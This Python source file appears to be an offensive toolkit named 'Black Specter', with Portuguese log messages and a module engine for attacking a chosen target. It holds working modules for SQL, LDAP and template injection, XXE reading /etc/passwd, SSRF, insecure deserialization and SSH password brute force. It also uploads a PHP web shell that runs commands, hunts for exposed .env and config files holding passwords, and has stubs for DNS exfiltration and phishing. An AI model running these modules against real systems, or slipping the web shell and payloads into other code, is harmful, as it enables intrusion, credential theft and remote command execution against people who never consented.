import argparse
import json
import requests
import socket
import base64
import time
import paramiko
import urllib.parse


def log_info(msg):
    print(f"[INFO] {msg}")

def log_error(msg):
    print(f"[ERRO] {msg}")

def log_success(msg):
    print(f"[SUCESSO] {msg}")

ASCII_ART = r'''
███████████  ████                     █████                          
░░███░░░░░███░░███                    ░░███                          
 ░███    ░███ ░███   ██████    ██████  ░███ █████                    
 ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                     
 ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                      
 ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                     
 ███████████  █████░░████████░░██████  ████ █████                    
░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                     
                                                                      
                                                                      
                                                                      
  █████████                               █████                       
 ███░░░░░███                             ░░███                        
░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████  
░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███ 
 ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░  
 ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███      
░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████     
 ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░     
             ░███                                                  
             █████                                                 
            ░░░░░                                                  
'''


class SQLIAutoExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/search')
        self.param = config.get('param', 'q')
        self.payloads = config.get('payloads', ["' OR '1'='1", "' OR '1'='1' -- "])

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        for payload in self.payloads:
            params = {self.param: payload}
            log_info(f"Tentando SQL Injection com payload: {payload}")
            try:
                r = requests.get(url, params=params, timeout=5)
                if r.status_code == 200 and ("syntax error" in r.text.lower() or "mysql" in r.text.lower()):
                    log_success("Possível vulnerabilidade SQL Injection detectada!")
                    log_info(r.text[:300])
                    break
                else:
                    log_info("Payload não causou erro SQL visível.")
            except Exception as e:
                log_error(f"Erro no SQL Injection: {e}")

class RCEUpload:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.upload_path = config.get('upload_path', '/upload.php')
        self.file_content = config.get('file_content', '<?php system($_GET["cmd"]); ?>')
        self.file_name = config.get('file_name', 'shell.php')

    def run(self):
        url = f"{self.target}{self.upload_path}"
        files = {'file': (self.file_name, self.file_content, 'application/x-php')}
        log_info(f"Tentando upload para RCE em {url}")
        try:
            r = requests.post(url, files=files, timeout=5)
            if r.status_code == 200:
                log_success("Upload realizado, verificar execução remota.")
                log_info(r.text[:300])
            else:
                log_info(f"Upload falhou com status {r.status_code}")
        except Exception as e:
            log_error(f"Erro no upload para RCE: {e}")

class PhishingSimple:
    def __init__(self, target, config):
        self.url = config.get('phishing_url', 'http://malicious.com/login')

    def run(self):
        log_info(f"URL de phishing para ataque simples: {self.url}")

class DeserializationExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/deserialize')
        self.payload = config.get('payload', '')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        headers = {'Content-Type': 'application/octet-stream'}
        data = base64.b64decode(self.payload) if self.payload else b''
        log_info(f"Tentando exploração de deserialização insegura em {url}")
        try:
            r = requests.post(url, data=data, headers=headers, timeout=5)
            if r.status_code == 200 and ("error" not in r.text.lower()):
                log_success("Resposta indica possível exploração de deserialização!")
                log_info(r.text[:300])
            else:
                log_info("Resposta não indica sucesso na exploração.")
        except Exception as e:
            log_error(f"Erro na exploração de deserialização: {e}")

class BannerGrabber:
    def __init__(self, target, config):
        self.target = target
        self.port = config.get('port', 80)

    def run(self):
        log_info(f"Tentando captura de banner em {self.target}:{self.port}")
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((self.target, self.port))
            s.send(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = s.recv(1024).decode(errors='ignore')
            log_success(f"Banner capturado:\n{banner}")
            s.close()
        except Exception as e:
            log_error(f"Erro ao capturar banner: {e}")

class DNSExfiltrationExample:
    def __init__(self, target, config):
        self.target = target
        self.data = config.get('data', 'exfil.example.com')

    def run(self):
        log_info(f"Exfiltrando dados via DNS para {self.data}")
        # Simulação de exfiltração (não implementada)
        log_success("Exfiltração DNS simulada (implemente a lógica real).")

class ConfigFilePasswordFinder:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.paths = config.get('paths', ['/config.php', '/.env'])

    def run(self):
        for path in self.paths:
            url = f"{self.target}{path}"
            log_info(f"Buscando arquivo de configuração em {url}")
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and ('password' in r.text.lower() or 'secret' in r.text.lower()):
                    log_success(f"Arquivo de configuração possivelmente exposto: {url}")
                    log_info(r.text[:300])
                else:
                    log_info(f"Nenhum arquivo sensível encontrado em {url}")
            except Exception as e:
                log_error(f"Erro ao buscar arquivo config: {e}")

class PortScannerWithBanner:
    def __init__(self, target, config):
        self.target = target
        self.ports = config.get('ports', [80, 443])

    def run(self):
        log_info(f"Escaneando portas {self.ports} em {self.target}")
        for port in self.ports:
            try:
                s = socket.socket()
                s.settimeout(2)
                result = s.connect_ex((self.target, port))
                if result == 0:
                    log_success(f"Porta {port} aberta em {self.target}")
                else:
                    log_info(f"Porta {port} fechada ou filtrada")
                s.close()
            except Exception as e:
                log_error(f"Erro no scanner de portas: {e}")

class LDAPInjectionExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/ldapsearch')
        self.param = config.get('param', 'username')
        self.payload = config.get('payload', '*)(|(objectClass=*))')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        params = {self.param: self.payload}
        log_info(f"Tentando LDAP Injection em {url} com payload {self.payload}")
        try:
            r = requests.get(url, params=params, timeout=5)
            if r.status_code == 200 and "ldap" in r.text.lower():
                log_success("Resposta indica possível LDAP Injection!")
                log_info(r.text[:300])
            else:
                log_info("Resposta não indica sucesso no LDAP Injection.")
        except Exception as e:
            log_error(f"Erro no LDAP Injection: {e}")

class SSRFExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/fetch')
        self.param = config.get('param', 'url')
        self.payload = config.get('payload', 'http://127.0.0.1/admin')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        params = {self.param: self.payload}
        log_info(f"Tentando SSRF em {url} com payload {self.payload}")
        try:
            r = requests.get(url, params=params, timeout=5)
            if r.status_code == 200:
                log_success("Resposta recebida, verificar possível SSRF.")
                log_info(r.text[:300])
            else:
                log_info(f"Falha SSRF com status {r.status_code}")
        except Exception as e:
            log_error(f"Erro no SSRF: {e}")

class SSTIExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/template')
        self.param = config.get('param', 'name')
        self.payload = config.get('payload', '{{7*7}}')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        params = {self.param: self.payload}
        log_info(f"Tentando SSTI em {url} com payload {self.payload}")
        try:
            r = requests.get(url, params=params, timeout=5)
            if r.status_code == 200 and '49' in r.text:
                log_success("Possível SSTI detectado!")
                log_info(r.text[:300])
            else:
                log_info("Resposta não indica SSTI.")
        except Exception as e:
            log_error(f"Erro no SSTI: {e}")

class XXEExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/upload')
        self.payload = config.get('payload', """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<foo>&xxe;</foo>""")

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        headers = {'Content-Type': 'application/xml'}
        log_info(f"Tentando XXE em {url}")
        try:
            r = requests.post(url, data=self.payload, headers=headers, timeout=5)
            if r.status_code == 200 and "root:" in r.text:
                log_success("Possível vulnerabilidade XXE detectada!")
                log_info(r.text[:300])
            else:
                log_info("Resposta não indica XXE.")
        except Exception as e:
            log_error(f"Erro no XXE: {e}")

class FileUploadExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.upload_path = config.get('upload_path', '/upload')
        self.file_name = config.get('file_name', 'shell.php')
        self.file_content = config.get('file_content', '<?php echo "Hacked"; ?>')

    def run(self):
        url = f"{self.target}{self.upload_path}"
        files = {'file': (self.file_name, self.file_content, 'application/x-php')}
        log_info(f"Tentando upload de arquivo em {url}")
        try:
            r = requests.post(url, files=files, timeout=5)
            if r.status_code == 200:
                log_success("Upload possível, verificar execução.")
                log_info(r.text[:300])
            else:
                log_info(f"Upload falhou com status {r.status_code}")
        except Exception as e:
            log_error(f"Erro no upload de arquivo: {e}")

class HTTPMethodsScanner:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.paths = config.get('paths', ['/'])

    def run(self):
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'PATCH']
        for path in self.paths:
            url = f"{self.target}{path}"
            log_info(f"Testando métodos HTTP em {url}")
            for method in methods:
                try:
                    r = requests.request(method, url, timeout=5)
                    log_info(f"{method}: {r.status_code}")
                except Exception as e:
                    log_error(f"Erro no método {method}: {e}")

class PortScanner:
    def __init__(self, target, config):
        self.target = target
        self.ports = config.get('ports', [21, 22, 23, 80, 443])

    def run(self):
        log_info(f"Escaneando portas em {self.target}")
        for port in self.ports:
            try:
                s = socket.socket()
                s.settimeout(1)
                result = s.connect_ex((self.target, port))
                if result == 0:
                    log_success(f"Porta {port} aberta")
                else:
                    log_info(f"Porta {port} fechada")
                s.close()
            except Exception as e:
                log_error(f"Erro escaneando porta {port}: {e}")

class SSHScanner:
    def __init__(self, target, config):
        self.target = target
        self.port = config.get('port', 22)
        self.userlist = config.get('userlist', ['root'])
        self.passlist = config.get('passlist', ['root'])

    def run(self):
        log_info(f"Tentando brute force SSH em {self.target}:{self.port}")
        for user in self.userlist:
            for pwd in self.passlist:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(self.target, port=self.port, username=user, password=pwd, timeout=3)
                    log_success(f"Login SSH válido: {user}:{pwd}")
                    ssh.close()
                    return
                except Exception:
                    log_info(f"Falha SSH: {user}:{pwd}")

class PHPInfoScanner:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.paths = config.get('paths', ['/phpinfo.php', '/info.php'])

    def run(self):
        for path in self.paths:
            url = f"{self.target}{path}"
            log_info(f"Buscando phpinfo em {url}")
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and "phpinfo()" in r.text.lower():
                    log_success(f"phpinfo() encontrado em {url}")
                    log_info(r.text[:300])
                else:
                    log_info(f"phpinfo() não encontrado em {url}")
            except Exception as e:
                log_error(f"Erro buscando phpinfo: {e}")

class JenkinsScanner:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.paths = config.get('paths', ['/jenkins', '/jenkins/login'])

    def run(self):
        for path in self.paths:
            url = f"{self.target}{path}"
            log_info(f"Verificando Jenkins em {url}")
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and "jenkins" in r.text.lower():
                    log_success(f"Instância Jenkins detectada: {url}")
                else:
                    log_info(f"Nenhum Jenkins detectado em {url}")
            except Exception as e:
                log_error(f"Erro buscando Jenkins: {e}")

class XSSScanner:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/search')
        self.param = config.get('param', 'q')
        self.payload = config.get('payload', '<script>alert(1)</script>')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        params = {self.param: self.payload}
        log_info(f"Tentando XSS em {url}")
        try:
            r = requests.get(url, params=params, timeout=5)
            if self.payload in r.text:
                log_success("Possível vulnerabilidade XSS detectada!")
            else:
                log_info("Resposta não indica XSS.")
        except Exception as e:
            log_error(f"Erro no XSS: {e}")

class CVEExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/vulnerable')
        self.payload = config.get('payload', 'test_payload')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        log_info(f"Tentando exploração genérica CVE em {url} com payload: {self.payload}")
        try:
            r = requests.post(url, data={'exploit': self.payload}, timeout=5)
            if r.status_code == 200 and 'vulnerable' in r.text.lower():
                log_success("Possível vulnerabilidade detectada com payload CVE!")
                log_info(r.text[:300])
            else:
                log_info("Resposta não indica vulnerabilidade CVE.")
        except Exception as e:
            log_error(f"Erro na exploração CVE: {e}")



class SpecterEngine:
    def __init__(self):
        self.modules = {
            'sqliautoexploit': SQLIAutoExploit,
            'rceupload': RCEUpload,
            'phishingsimple': PhishingSimple,
            'deserializationexploit': DeserializationExploit,
            'bannergrabber': BannerGrabber,
            'dnsexfiltrationexample': DNSExfiltrationExample,
            'configfilepasswordfinder': ConfigFilePasswordFinder,
            'portscannerwithbanner': PortScannerWithBanner,
            'ldapinjectionexploit': LDAPInjectionExploit,
            'ssrfexploit': SSRFExploit,
            'sstiexploit': SSTIExploit,
            'xxeexploit': XXEExploit,
            'fileuploadexploit': FileUploadExploit,
            'httpmethodsscanner': HTTPMethodsScanner,
            'portscanner': PortScanner,
            'sshscanner': SSHScanner,
            'phpinfoscanner': PHPInfoScanner,
            'jenkinsscanner': JenkinsScanner,
            'xssscanner': XSSScanner,
            'cveexploit': CVEExploit
        }

    def run_module(self, module_name, target, config):
        module_class = self.modules.get(module_name.lower())
        if not module_class:
            log_error(f"Módulo {module_name} não encontrado.")
            return
        module = module_class(target, config)
        module.run()
